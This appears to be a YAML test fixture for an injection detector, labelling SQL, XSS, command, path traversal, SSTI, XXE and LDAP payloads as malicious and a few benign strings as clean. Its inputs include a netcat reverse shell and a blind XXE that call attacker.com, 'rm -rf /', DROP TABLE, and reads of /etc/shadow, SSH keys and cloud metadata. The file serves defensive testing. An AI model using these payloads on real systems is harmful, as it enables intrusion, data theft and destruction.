@@ -1,0 +1,76 @@
+scenarios:
+  # SQL Injection - 10 core scenarios (rest dynamic)
+  - {id: sqli_001, category: sqli, subcategory: union_based, input: "' UNION SELECT username, password FROM users--", expected: 1, difficulty: easy, description: "Basic UNION SQL injection"}
+  - {id: sqli_002, category: sqli, subcategory: blind_boolean, input: "' AND '1'='1", expected: 1, difficulty: easy, description: "Boolean-based blind SQLi"}
+  - {id: sqli_003, category: sqli, subcategory: time_based, input: "'; WAITFOR DELAY '00:00:05'--", expected: 1, difficulty: medium, description: "Time-based blind SQLi"}
+  - {id: sqli_004, category: sqli, subcategory: error_based, input: "' AND 1=CONVERT(int, (SELECT @@version))--", expected: 1, difficulty: medium, description: "Error-based SQLi"}
+  - {id: sqli_005, category: sqli, subcategory: stacked, input: "'; DROP TABLE users--", expected: 1, difficulty: hard, description: "Stacked query DROP TABLE"}
+  - {id: sqli_006, category: sqli, subcategory: union_based, input: "' UNION SELECT NULL, NULL, NULL--", expected: 1, difficulty: easy, description: "UNION with NULL columns"}
+  - {id: sqli_007, category: sqli, subcategory: blind_boolean, input: "' OR 1=1--", expected: 1, difficulty: easy, description: "Classic OR 1=1"}
+  - {id: sqli_008, category: sqli, subcategory: time_based, input: "' OR SLEEP(5)--", expected: 1, difficulty: medium, description: "MySQL SLEEP injection"}
+  - {id: sqli_009, category: sqli, subcategory: stacked, input: "'; INSERT INTO users VALUES ('hacker', 'pass')--", expected: 1, difficulty: hard, description: "Stacked INSERT"}
+  - {id: sqli_010, category: sqli, subcategory: union_based, input: "' UNION SELECT table_name FROM information_schema.tables--", expected: 1, difficulty: medium, description: "Information schema enum"}
+  
+  # XSS - 10 core scenarios
+  - {id: xss_001, category: xss, subcategory: reflected, input: "<script>alert(1)</script>", expected: 1, difficulty: easy, description: "Basic reflected XSS"}
+  - {id: xss_002, category: xss, subcategory: reflected, input: "<img src=x onerror=alert(1)>", expected: 1, difficulty: easy, description: "Image onerror XSS"}
+  - {id: xss_003, category: xss, subcategory: reflected, input: "<svg onload=alert(1)>", expected: 1, difficulty: easy, description: "SVG onload XSS"}
+  - {id: xss_004, category: xss, subcategory: reflected, input: "javascript:alert(document.cookie)", expected: 1, difficulty: easy, description: "JavaScript protocol"}
+  - {id: xss_005, category: xss, subcategory: dom, input: "<iframe src=javascript:alert(1)>", expected: 1, difficulty: medium, description: "Iframe JavaScript src"}
+  - {id: xss_006, category: xss, subcategory: reflected, input: "<input onfocus=alert(1) autofocus>", expected: 1, difficulty: medium, description: "Input autofocus"}
+  - {id: xss_007, category: xss, subcategory: reflected, input: "<video src=x onerror=alert(1)>", expected: 1, difficulty: easy, description: "Video onerror"}
+  - {id: xss_008, category: xss, subcategory: reflected, input: "<a href=javascript:alert(1)>Click</a>", expected: 1, difficulty: easy, description: "Anchor JavaScript href"}
+  - {id: xss_009, category: xss, subcategory: reflected, input: "<svg><script>alert(1)</script></svg>", expected: 1, difficulty: medium, description: "SVG with script"}
+  - {id: xss_010, category: xss, subcategory: polyglot, input: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//", expected: 1, difficulty: hard, description: "XSS polyglot"}
+  
+  # Command Injection - 10 core scenarios
+  - {id: cmdi_001, category: cmdi, subcategory: shell, input: "| cat /etc/passwd", expected: 1, difficulty: easy, description: "Pipe to cat"}
+  - {id: cmdi_002, category: cmdi, subcategory: shell, input: "; ls -la", expected: 1, difficulty: easy, description: "Semicolon separator"}
+  - {id: cmdi_003, category: cmdi, subcategory: shell, input: "$(whoami)", expected: 1, difficulty: easy, description: "Command substitution"}
+  - {id: cmdi_004, category: cmdi, subcategory: shell, input: "`id`", expected: 1, difficulty: easy, description: "Backtick substitution"}
+  - {id: cmdi_005, category: cmdi, subcategory: shell, input: "& ping -c 10 127.0.0.1", expected: 1, difficulty: easy, description: "Background execution"}
+  - {id: cmdi_006, category: cmdi, subcategory: shell, input: "; rm -rf /", expected: 1, difficulty: hard, description: "Destructive rm"}
+  - {id: cmdi_007, category: cmdi, subcategory: shell, input: "|| cat /etc/shadow", expected: 1, difficulty: medium, description: "OR operator"}
+  - {id: cmdi_008, category: cmdi, subcategory: shell, input: "&& cat /etc/hosts", expected: 1, difficulty: medium, description: "AND operator"}
+  - {id: cmdi_009, category: cmdi, subcategory: powershell, input: "; Get-Process", expected: 1, difficulty: easy, description: "PowerShell Get-Process"}
+  - {id: cmdi_010, category: cmdi, subcategory: shell, input: "; nc -e /bin/sh attacker.com 4444", expected: 1, difficulty: hard, description: "Netcat reverse shell"}
+  
+  # Path Traversal - 10 core scenarios
+  - {id: path_001, category: path_traversal, subcategory: basic, input: "../../../etc/passwd", expected: 1, difficulty: easy, description: "Basic path traversal"}
+  - {id: path_002, category: path_traversal, subcategory: basic, input: "..\\..\\..\\windows\\system32\\config\\sam", expected: 1, difficulty: easy, description: "Windows path traversal"}
+  - {id: path_003, category: path_traversal, subcategory: encoded, input: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", expected: 1, difficulty: medium, description: "URL encoded traversal"}
+  - {id: path_004, category: path_traversal, subcategory: encoded, input: "..%252f..%252f..%252fetc/passwd", expected: 1, difficulty: hard, description: "Double URL encoded"}
+  - {id: path_005, category: path_traversal, subcategory: basic, input: "....//....//....//etc/passwd", expected: 1, difficulty: medium, description: "Double dot slash"}
+  - {id: path_006, category: path_traversal, subcategory: null_byte, input: "../../../etc/passwd%00.jpg", expected: 1, difficulty: hard, description: "Null byte injection"}
+  - {id: path_007, category: path_traversal, subcategory: basic, input: "/var/www/../../etc/passwd", expected: 1, difficulty: medium, description: "Absolute with traversal"}
+  - {id: path_008, category: path_traversal, subcategory: basic, input: "../../../etc/shadow", expected: 1, difficulty: medium, description: "Shadow file access"}
+  - {id: path_009, category: path_traversal, subcategory: basic, input: "../../../home/user/.ssh/id_rsa", expected: 1, difficulty: hard, description: "SSH key access"}
+  - {id: path_010, category: path_traversal, subcategory: basic, input: "file:///etc/passwd", expected: 1, difficulty: medium, description: "File protocol"}
+  
+  # SSTI - 5 core scenarios
+  - {id: ssti_001, category: ssti, subcategory: jinja2, input: "{{7*7}}", expected: 1, difficulty: easy, description: "Basic Jinja2 SSTI"}
+  - {id: ssti_002, category: ssti, subcategory: jinja2, input: "{{config.items()}}", expected: 1, difficulty: medium, description: "Jinja2 config access"}
+  - {id: ssti_003, category: ssti, subcategory: twig, input: "{{7*'7'}}", expected: 1, difficulty: easy, description: "Basic Twig SSTI"}
+  - {id: ssti_004, category: ssti, subcategory: freemarker, input: "${7*7}", expected: 1, difficulty: easy, description: "Basic FreeMarker SSTI"}
+  - {id: ssti_005, category: ssti, subcategory: jinja2, input: "{{''.__class__.__mro__[1].__subclasses__()}}", expected: 1, difficulty: hard, description: "Jinja2 class traversal"}
+  
+  # XXE - 5 core scenarios
+  - {id: xxe_001, category: xxe, subcategory: basic, input: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>", expected: 1, difficulty: medium, description: "Basic XXE file read"}
+  - {id: xxe_002, category: xxe, subcategory: blind, input: "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]>", expected: 1, difficulty: hard, description: "Blind XXE"}
+  - {id: xxe_003, category: xxe, subcategory: basic, input: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><foo>&xxe;</foo>", expected: 1, difficulty: medium, description: "XXE shadow file"}
+  - {id: xxe_004, category: xxe, subcategory: basic, input: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]><foo>&xxe;</foo>", expected: 1, difficulty: hard, description: "XXE with PHP filter"}
+  - {id: xxe_005, category: xxe, subcategory: basic, input: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><foo>&xxe;</foo>", expected: 1, difficulty: hard, description: "XXE SSRF to AWS metadata"}
+  
+  # LDAP - 5 core scenarios
+  - {id: ldap_001, category: ldap, subcategory: injection, input: "*)(uid=*))(|(uid=*", expected: 1, difficulty: medium, description: "LDAP injection bypass"}
+  - {id: ldap_002, category: ldap, subcategory: injection, input: "admin)(&)", expected: 1, difficulty: easy, description: "LDAP admin bypass"}
+  - {id: ldap_003, category: ldap, subcategory: injection, input: "*)(objectClass=*", expected: 1, difficulty: medium, description: "LDAP wildcard injection"}
+  - {id: ldap_004, category: ldap, subcategory: injection, input: "*))(|(password=*", expected: 1, difficulty: medium, description: "LDAP password enum"}
+  - {id: ldap_005, category: ldap, subcategory: injection, input: "*)(cn=*))%00", expected: 1, difficulty: hard, description: "LDAP null byte"}
+  
+  # Benign Edge Cases - 5 scenarios
+  - {id: benign_001, category: benign, subcategory: edge_case, input: "SELECT * FROM menu WHERE category='desserts'", expected: 0, difficulty: medium, description: "Benign SQL-like query"}
+  - {id: benign_002, category: benign, subcategory: edge_case, input: "<3 love this product!", expected: 0, difficulty: hard, description: "Heart emoji"}
+  - {id: benign_003, category: benign, subcategory: edge_case, input: "john.doe@example.com", expected: 0, difficulty: easy, description: "Normal email"}
+  - {id: benign_004, category: benign, subcategory: edge_case, input: "C:\\Users\\John\\Documents\\report.pdf", expected: 0, difficulty: medium, description: "Windows file path"}
+  - {id: benign_005, category: benign, subcategory: edge_case, input: "if (condition) { doSomething(); }", expected: 0, difficulty: hard, description: "JavaScript code snippet"}
